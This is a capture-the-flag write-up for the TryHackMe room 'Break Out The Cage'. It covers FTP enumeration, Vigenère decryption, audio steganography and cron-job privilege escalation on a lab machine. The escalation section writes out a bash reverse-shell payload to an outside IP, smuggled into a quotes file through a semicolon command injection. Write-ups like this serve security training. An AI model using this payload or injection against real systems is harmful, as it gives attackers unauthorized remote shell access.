# Break Out The Cage
---

## Initial Enumeration

As always, we start with some basic enumeration:

```bash
nmap -sV -sC 10.130.141.16
```

![](images/Pasted%20image%2020260623232039.png)

The scan reveals an FTP service on **port 21** with **Anonymous** login enabled.

Let's see what's inside.

```bash
ftp 10.130.141.16
#username: Anonymous
#Password: Anything           (u can type one letter if u want too)
```

![](images/Pasted%20image%2020260623233840.png)

Inside, we find a file. After downloading it, it looks like Base64-encoded text. However, even after decoding it, we're left with something that still doesn't make much sense.

![](images/Pasted%20image%2020260623233934.png)

```bash
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

After a bit of analysis, the text appears to be encrypted using a **Vigenère cipher**.

![](images/Pasted%20image%2020260624152108.png)

Now we know the encryption method, but we're still missing the key.

Nothing useful appears in the FTP directory or the directories we've already discovered, so it's time to enumerate the web server a little more thoroughly.

![](images/Pasted%20image%2020260624165554.png)

This time we discover another directory containing an MP3 file.

Let's grab it.

```bash
wget http://10.130.141.16/auditions/must_practice_corrupt_file.mp3
```

![](images/Pasted%20image%2020260624003823.png)

---

## Finding the Cipher Key

Opening the audio file in **Audacity** and switching the waveform to **Spectrogram** mode reveals hidden text embedded inside the audio.

The hidden message is:

**namelesstwo**

If Audacity isn't installed:

```bash
sudo apt install audacity
```

![](images/Pasted%20image%2020260624152759.png)

Let's test **namelesstwo** as the Vigenère key...

Success!

![](images/Pasted%20image%2020260624152933.png)

The TryHackMe room mentions that this password belongs to **Weston**, so let's try SSH.

![](images/Pasted%20image%2020260624153349.png)

We're in.

---

## Privilege Escalation

The first thing I like to check after getting a foothold is whether any scheduled tasks are running.

For that, I used **pspy64**.

Tool:

[https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

![](images/Pasted%20image%2020260624155728.png)

One thing that already hinted at a cron job was the random quotes that kept appearing in the shell every few minutes.

Now let's inspect the script and the permissions around it.

![](images/Pasted%20image%2020260624155953.png)

The Python script is reading random quotes from **.files/.quotes**, and interestingly, **Weston** has **read and write** permissions on that file.

Even better, the script **spread_the_quotes.py** is executed as **cage**.

That means if we can control the contents of `.quotes`, we can inject our own command and have it executed as **cage**.

Before modifying anything, let's quickly inspect the file.

![](images/Pasted%20image%2020260624160124.png)

Now we overwrite it with a reverse shell payload.

```bash
weston@national-treasure:/opt/.dads_scripts/.files$
cat > .quotes << 'EOF'
; bash -c 'bash -i >& /dev/tcp/192.168.143.26/4445 0>&1'
EOF
```

The leading **`;`** is important.

The script eventually executes the quote using **wall**, and the semicolon simply tells Bash:

> "Execute the previous command, then run my payload."

![](images/Pasted%20image%2020260624164236.png)

After waiting for the scheduled task to execute...

We catch a shell as **cage**.

---

## User Flag

Now we can freely explore Cage's home directory.

![](images/Pasted%20image%2020260624165406.png)

After a bit of browsing, a few `cd`s, and several `cat`s, we finally recover the user flag.

![](images/Pasted%20image%2020260624165445.png)

---

## Root

While looking through Cage's emails, something catches the eye.

Email #3 contains this strange word:

**haiinspsyanileph**

![](images/Pasted%20image%2020260624175258.png)

The same email repeatedly mentions the word **face**, which feels a little too intentional.

Since the machine already introduced us to Vigenère ciphers earlier, it's a good guess that **face** might be the key.

Sure enough...

![](images/Pasted%20image%2020260624175430.png)

The decrypted text turns out to be **root's password**.

Using it, we simply switch users and retrieve the root flag.

![](images/Pasted%20image%2020260624180425.png)


---

## Conclusion

A fun Easy room overall. It mixes a bit of everything: FTP enumeration, a Vigenère cipher, audio steganography, cron job abuse, and a simple privilege escalation path. 
Nothing felt unfair, and every clue naturally pointed to the next step. 
Definitely a nice room if you're looking to practice Linux enumeration and get exposed to a couple of less common techniques.

**— 0xchnk**